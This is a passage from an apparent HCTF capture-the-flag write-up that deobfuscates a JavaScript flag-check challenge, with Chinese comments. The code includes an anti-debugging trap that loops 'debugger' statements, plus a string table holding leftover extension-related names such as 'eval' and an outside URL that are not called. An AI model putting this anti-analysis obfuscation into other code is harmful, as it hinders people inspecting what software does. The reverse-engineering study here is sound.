_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                (<span class="function"><span class="keyword">function</span> <span class="title">_0x3c3bd8</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (<span class="function"><span class="keyword">function</span> <span class="title">_0x4dc510</span>(<span class="params">_0x460a91</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> ((<span class="string">&#x27;&#x27;</span> + _0x460a91 / _0x460a91)[_0xa180(<span class="string">&#x27;0x30&#x27;</span>)] !== <span class="number">0x1</span> || _0x460a91 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">                                (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">debugger</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _0x4dc510(++_0x460a91);</span><br><span class="line">                        &#125;(<span class="number">0x0</span>));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (_0x30f185) &#123;</span><br><span class="line">                        <span class="built_in">setTimeout</span>(_0x3c3bd8, <span class="number">0x1388</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        h = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4c466e, _0x28871</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3ea581 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x2fbf7a = <span class="number">0x0</span>; _0x2fbf7a &lt; _0x4c466e[_0x43c8d1(<span class="number">0x8</span>)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)] || (_0x1c3854(j[<span class="number">0x0</span>]) ^ _0x1c3854(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        l = h(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x55b09f = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!m || _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x4cbb89) &#123;</span><br><span class="line">        <span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5bf136 = <span class="built_in">document</span>[_0xa180(<span class="string">&#x27;0x32&#x27;</span>)](_0xa180(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0x5bf136 == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x4d0e29 = check(_0x5bf136);</span><br><span class="line">    <span class="keyword">if</span> (_0x4d0e29) &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(_0xa180(<span class="string">&#x27;0x38&#x27;</span>), <span class="number">0x32</span>);</span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进一步反混淆</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 洗牌</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1661d3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数组内容</span></span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _0x180a[_0x5c351c - <span class="number">0x0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主要的check函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, _0xa180(<span class="string">&#x27;0x0&#x27;</span>), _0xa180(<span class="string">&#x27;0x1&#x27;</span>), _0xa180(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, _0xa180(<span class="string">&#x27;0x3&#x27;</span>), _0xa180(<span class="string">&#x27;0x4&#x27;</span>), _0xa180(<span class="string">&#x27;0x5&#x27;</span>), _0xa180(<span class="string">&#x27;0x6&#x27;</span>), _0xa180(<span class="string">&#x27;0x7&#x27;</span>), _0xa180(<span class="string">&#x27;0x8&#x27;</span>), _0xa180(<span class="string">&#x27;0x9&#x27;</span>), _0xa180(<span class="string">&#x27;0xa&#x27;</span>), _0xa180(<span class="string">&#x27;0xb&#x27;</span>), _0xa180(<span class="string">&#x27;0xc&#x27;</span>), _0xa180(<span class="string">&#x27;0xd&#x27;</span>), _0xa180(<span class="string">&#x27;0xe&#x27;</span>), _0xa180(<span class="string">&#x27;0xf&#x27;</span>), _0xa180(<span class="string">&#x27;0x10&#x27;</span>), _0xa180(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, _0xa180(<span class="string">&#x27;0x12&#x27;</span>), _0xa180(<span class="string">&#x27;0x13&#x27;</span>), _0xa180(<span class="string">&#x27;0x14&#x27;</span>), _0xa180(<span class="string">&#x27;0x15&#x27;</span>), _0xa180(<span class="string">&#x27;0x16&#x27;</span>), _0xa180(<span class="string">&#x27;0x17&#x27;</span>), _0xa180(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, _0xa180(<span class="string">&#x27;0x19&#x27;</span>), _0xa180(<span class="string">&#x27;0x1a&#x27;</span>), _0xa180(<span class="string">&#x27;0x1b&#x27;</span>), _0xa180(<span class="string">&#x27;0x1c&#x27;</span>), _0xa180(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, _0xa180(<span class="string">&#x27;0x1e&#x27;</span>), _0xa180(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, _0xa180(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, _0xa180(<span class="string">&#x27;0x21&#x27;</span>), _0xa180(<span class="string">&#x27;0x22&#x27;</span>), _0xa180(<span class="string">&#x27;0x23&#x27;</span>), _0xa180(<span class="string">&#x27;0x24&#x27;</span>), _0xa180(<span class="string">&#x27;0x25&#x27;</span>), _0xa180(<span class="string">&#x27;0x26&#x27;</span>), _0xa180(<span class="string">&#x27;0x27&#x27;</span>), _0xa180(<span class="string">&#x27;0x28&#x27;</span>), _0xa180(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, _0xa180(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = input[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);  <span class="comment">// 获取输入的前四位，hctf&#123;</span></span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(btoa(_0x50559f), <span class="number">0x20</span>);  <span class="comment">// Base64编码，转成int</span></span><br><span class="line">        <span class="built_in">console</span>.log(_0x5cea12);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 启动Debugger，干扰console，但是对输入没有任何影响</span></span><br><span class="line"><span class="comment">        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) &#123;</span></span><br><span class="line"><span class="comment">            _0x2d59cf = function (_0x4be75f) &#123;</span></span><br><span class="line"><span class="comment">                return _0x4be75f[&#x27;toString&#x27;](_0x177f13);</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            if (!&#x27;&#x27; [&#x27;replace&#x27;](/^/, String)) &#123;</span></span><br><span class="line"><span class="comment">                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span></span><br><span class="line"><span class="comment">                _0x802d91 = [</span></span><br><span class="line"><span class="comment">                    function (_0x5e8f1a) &#123;</span></span><br><span class="line"><span class="comment">                        return _0x2829f2[_0x5e8f1a];</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                ];</span></span><br><span class="line"><span class="comment">                _0x2d59cf = function () &#123;</span></span><br><span class="line"><span class="comment">                    return _0xa180(&#x27;0x2b&#x27;);</span></span><br><span class="line"><span class="comment">                &#125;;</span></span><br><span class="line"><span class="comment">                _0x46da6f = 0x1;</span></span><br><span class="line"><span class="comment">            &#125;;</span></span><br><span class="line"><span class="comment">            while (_0x46da6f--)</span></span><br><span class="line"><span class="comment">                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(&#x27;0x2c&#x27;)](new RegExp(&#x27;\x5cb&#x27; + _0x2d59cf(_0x46da6f) + &#x27;\x5cb&#x27;, &#x27;g&#x27;), _0x802d91[_0x46da6f]);</span></span><br><span class="line"><span class="comment">            return _0x200db2;</span></span><br><span class="line"><span class="comment">        &#125;(_0xa180(&#x27;0x2d&#x27;), 0x11, 0x11, _0xa180(&#x27;0x2e&#x27;)[&#x27;split&#x27;](&#x27;|&#x27;), 0x0, &#123;&#125;));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重新洗牌，保证输入的前四位是hctf&#123;</span></span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3aba26</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            _0xaed809(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数组内容</span></span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3120e0</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2e2f8d[<span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>)];</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符串转十六进制</span></span><br><span class="line">        <span class="keyword">var</span> stringToHex = <span class="function"><span class="keyword">function</span> (<span class="params">_0x52ba71</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span 